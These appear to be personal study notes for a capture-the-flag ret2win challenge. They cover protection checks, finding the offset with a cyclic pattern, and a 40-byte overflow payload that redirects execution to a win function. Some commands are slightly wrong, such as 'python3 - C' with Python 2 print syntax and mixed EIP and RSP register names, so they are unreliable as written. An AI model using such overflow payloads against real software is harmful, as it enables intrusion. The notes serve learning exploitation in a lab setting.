### N o T e S

---

In ret2win, we need to execute the win function to get the flag by overwriting the EIP.

- First two steps, add permissions using chmod  +x file name.  
- Then, check the options and protections enabled using checksec --file.  
- Aim of the pwn challenge is generally to overflow the buffer and overwrite the return address.
- It redirects the program towards a function which outputs the flag.

```py
NO PIE - It means the executable file and server have the same coded source file and won't change each time the program loads.
NX ENABLED - We cannot inject our own shellcode to the stack and execute it.
NO STACK CANARY - We can overflow the buffer and there won't be any canaries.
PARTIAL RELRO - read and write availability.
```

---

Use Ghidra and GDB. 

```py
PUTS - It displays some output just like printf.
GETS - It reads some data just like scanf.

Finding the offset : 
1. Generate a cyclic pattern : cyclic 100.
2. The first four bytes in RSP is the offset.
3. Use cyclic -l <four bytes> to find the actual offset.
4. Use the offset to overflow the function and return statement.
```

---


```py
Steps : 
disassemble flag
(assume offset is 40)

We use the memory address of the first function in disassemble flag
(assume it is 0x0000000000401196)

python3 - C 'print "A" * 40 + "\x96\x11\x40\x00\x00\x00\x00\x00" ' 

(add this to a file payload)
python3 - C 'print "A" * 40 + "\x96\x11\x40\x00\x00\x00\x00\x00" ' > payload

echo "Fake_flag" > flag.txt
(Dummy flag for local file)

Now, run < payload 
(fake_flag will be printed)

./zoom2win < payload
fake_flag Segmentation fault

Now when we run the netcat command with the payload we get our flag.
```

---

Thank you

